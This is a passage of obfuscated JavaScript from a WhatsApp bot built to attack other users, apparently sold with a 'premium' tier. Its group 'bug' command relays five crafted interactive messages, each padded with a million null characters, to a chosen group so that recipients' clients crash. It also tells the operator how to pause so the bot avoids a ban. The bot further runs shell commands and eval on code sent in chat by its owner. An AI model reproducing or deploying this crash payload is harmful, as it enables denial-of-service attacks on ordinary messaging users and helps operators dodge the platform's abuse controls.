          _0x5d98d9("<✓> Successfully Send Bug to " + target + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'internal-group':
      case "external-group":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " <idgroup@g.us>");
          }
          _0x5d98d9("_</> successfully send bug to target_");
          target = q;
          for (let _0x1d5c87 = 0x0; _0x1d5c87 < 0x5; _0x1d5c87++) {
            var _0x477bf6 = generateWAMessageFromContent(_0x44bc2a.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'title': '',
                      'subtitle': " "
                    },
                    'body': {
                      'text': "🩸⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                    },
                    'footer': {
                      'text': "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': "cta_url",
                        'buttonParamsJson': "{ display_text : '𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒', url : , merchant_url :  }"
                      }],
                      'messageParamsJson': "\0".repeat(0xf4240)
                    }
                  }
                }
              }
            }), {
              'userJid': _0x44bc2a.chat,
              'quoted': _0x4d43fb
            });
            await _0x38dbed.relayMessage(target, _0x477bf6.message, {
              'messageId': _0x477bf6.key.id
            });
            await sleep(0x2bc);
          }
          _0x5d98d9("<✓> Successfully Send Bug to " + target + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "gegegememejsbsbsksvsj":
        if (!_0x215af5) {
          return _0x5d98d9("Maaf, command ini hanya untuk pemilik.");
        }
        if (!_0x514477) {
          return _0x5d98d9("Khusus Grup");
        }
        var _0x48b503 = _0x11ed7f.indexOf(_0x44bc2a.chat);
        _0x11ed7f.splice(_0x48b503, 0x1);
        fs.writeFileSync("./all/database/idgrup.json", JSON.stringify(_0x11ed7f));
        _0x5d98d9(_0x19c9fe + " berhasil nonaktif");
        break;
      case "gegegememejsbsbsksvsj":
        if (!_0x215af5) {
          return _0x5d98d9("Maaf, command ini hanya untuk pemilik.");
        }
        if (!_0x514477) {
          return _0x5d98d9("Khusus Grup");
        }
        _0x11ed7f.push(_0x44bc2a.chat);
        fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(_0x11ed7f));
        _0x5d98d9(_0x19c9fe + " berhasil aktif");
      default:
        if (_0x2010be.startsWith('$')) {
          if (!_0x215af5) {
            return;
          }
          exec(_0x2010be.slice(0x2), (_0x3be4f2, _0x5bc709) => {
            if (_0x3be4f2) {
              return _0x38dbed.sendMessage(_0x44bc2a.chat, {
                'text': _0x3be4f2.toString()
              }, {
                'quoted': _0x44bc2a
              });
            }
            if (_0x5bc709) {
              return _0x38dbed.sendMessage(_0x44bc2a.chat, {
                'text': util.format(_0x5bc709)
              }, {
                'quoted': _0x44bc2a
              });
            }
          });
        }
        if (_0x2010be.startsWith('>')) {
          if (!_0x215af5) {
            return;
          }
          try {
            let _0x1cf7bc = await eval(_0x1b3c99);
            if (typeof _0x1cf7bc !== 'string') {
              _0x1cf7bc = util.inspect(_0x1cf7bc);
            }
            _0x38dbed.sendMessage(_0x44bc2a.chat, {
              'text': util.format(_0x1cf7bc)
            }, {
              'quoted': _0x44bc2a
            });
          } catch (_0x54e59e) {
            _0x38dbed.sendMessage(_0x44bc2a.chat, {
              'text': util.format(_0x54e59e)
            }, {
              'quoted': _0x44bc2a
            });
          }
        }
        if (_0x2010be.startsWith('=>')) {
          if (!_0x215af5) {
            return;
          }
          try {
            const _0x36096f = await eval(";(async () => { " + _0x1b3c99 + " })();");
            return _0x38dbed.sendMessage(_0x44bc2a.chat, {
              'text': util.format(_0x36096f)
            }, {
              'quoted': _0x44bc2a
            });
          } catch (_0x1d6a4b) {
            return _0x38dbed.sendMessage(_0x44bc2a.chat, {
              'text': util.format(_0x1d6a4b)
            }, {
              'quoted': _0x44bc2a
            });
          }
        }
    }
  } catch (_0x385d17) {
    console.log(_0x385d17);
    _0x38dbed.sendMessage(owner + "@s.whatsapp.net", {
      'text': util.format(_0x385d17) + "\n\ndari: " + _0x44bc2a.sender.split('@')[0x0]
    }, {
      'quoted': _0x44bc2a
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});